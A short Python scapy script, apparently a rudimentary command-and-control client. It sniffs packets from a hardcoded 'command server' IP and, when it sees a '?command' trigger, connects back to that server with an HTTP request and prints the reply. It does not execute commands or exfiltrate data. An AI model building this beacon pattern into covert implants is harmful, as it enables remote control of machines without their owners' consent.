from scapy.all import *
import random
import sys
import socket



#command server ip
serverIP = "207.246.82.100"
serverPort = 8000

def respondToServer(pkt):
	if pkt.haslayer(Raw):
		#respond if a packet from the server includes this string set up a socket
		if "?command" in str(pkt.load):
			request = ('GET /test HTTP/1.1\nHost: ' + serverIP + '\n\n').encode()
			print("command received")
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((serverIP, serverPort))
			s.send(request)
			result = s.recv(256)
			if (len(result) > 0):
				print(result)

sniff(filter="host " + serverIP, prn=respondToServer)